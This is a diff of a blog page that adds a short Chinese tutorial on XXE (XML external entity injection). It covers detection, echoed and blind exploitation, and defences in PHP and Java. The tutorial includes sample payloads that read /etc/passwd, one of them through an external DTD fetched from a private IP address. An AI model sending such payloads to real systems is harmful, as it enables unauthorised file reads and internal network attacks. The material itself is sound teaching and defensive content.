@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>XXE漏洞 | blog</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>XXE | blog</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
  font-family: BenderLight;
  src: local('Bender'), url("/font/BenderLight.ttf");
 }
@@ -6,17 +6,47 @@
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
 }</style><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
-</head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/schedule/">Synopsis</a></nav></header><main style="flex-direction: row-reverse"><article><div id="post-bg"><div id="post-title"><h1>XXE漏洞</h1><hr></div><div id="post-content"><p>s</p>
-<p><strong>XXE漏洞</strong></p>
-<ul>
-<li>什么是XXE漏洞</li>
-</ul>
-<p>XML外部实体注入简称XXE漏洞，如果XML文件在引用外部实体的时，可以沟通构造恶意内容，可以导致读取任意文件，命令执行和内网的攻击。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/schedule/">Synopsis</a></nav></header><main style="flex-direction: row-reverse"><article><div id="post-bg"><div id="post-title"><h1>XXE</h1><hr></div><div id="post-content"><h2> XXE漏洞 </h2>
 
-<div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/07/26/XML/">← Prev XML</a><span style="color: #fe2"> | </span><a href="/2021/07/25/apachejiexi/">Apache换行解析漏洞 Next →</a><hr></div><div id="bottom-btn"><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
+<p><strong>什么是XEE</strong></p>
+<p>XEE也称为XML外部实体注入漏洞，该漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中获取数据，</p>
+<p><strong>危害</strong></p>
+<p>当XML引用外部实体时，通过·构造恶意内容，可导致读取任意文件，执行系统命令，探测内网端口，攻击内网网站等危害</p>
+<p><strong>构造实体注入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#直接通过DTD外部实体声明</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">  &lt;!ENTITY b SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;&amp;b;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#通过DTD文档引入外部DTD文档，再引入外部实体声明</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">  &lt;!ENTITY d SYSTEM <span class="string">&quot;http://192.168.17.3:3378/test.dtd&quot;</span>&gt;</span><br><span class="line">    %d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;&amp;b;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#test.dtd</span></span><br><span class="line">&lt;!ENTITY b SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞利用</strong></p>
+<ul>
+<li>判断漏洞存在的方法</li>
+</ul>
+<ol>
+<li>通过注入外部实体，通过bp抓包观察程序是如何传输数据的</li>
+<li>尝试插入外部实体，观察回显</li>
+<li>尝试插入外部地址的外部实体，观察是否有请求</li>
+</ol>
+<ul>
+<li>漏洞情景分类</li>
+</ul>
+<ol>
+<li>有回显</li>
+</ol>
+<p>可以直接在页面中看到payload的执行结果，直接利用进行敏感文件获取，直接输出结果</p>
+<ol start="2">
+<li>无回显</li>
+</ol>
+<p>看不到payload的执行结果，可通过外带使用外带数据通道提取数据</p>
+<p><strong>防范方法</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用开发语言提供的禁用外部实体的方法</span><br><span class="line"><span class="comment">#php：</span></span><br><span class="line">xml_disable_entity_loader(<span class="literal">true</span>)</span><br><span class="line"><span class="comment">#java:</span></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newinstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/07/26/XML/">← Prev XML</a><span style="color: #fe2"> | </span><a href="/2021/07/25/apachejiexi/">Apache换行解析漏洞 Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
  el: '#Valine'
  , appId: ''
  , appKey: ''
  , placeholder: '此条评论委托企鹅物流发送'
-})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/"> Dr.Mr.Li</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">9</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">9</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">4</span></div></section></div><div id="aside-block"></div><footer style="text-align: right"><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><wbr><nobr><span class="text-title">ICP</span><span class="text-content">——备案号——</span></nobr><wbr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>
+})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/"> Dr.Mr.Li</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">9</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">7</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">4</span></div></section></div><div id="aside-block"></div><footer style="text-align: right"><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><wbr><nobr><span class="text-title">ICP</span><span class="text-content">——备案号——</span></nobr><wbr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>
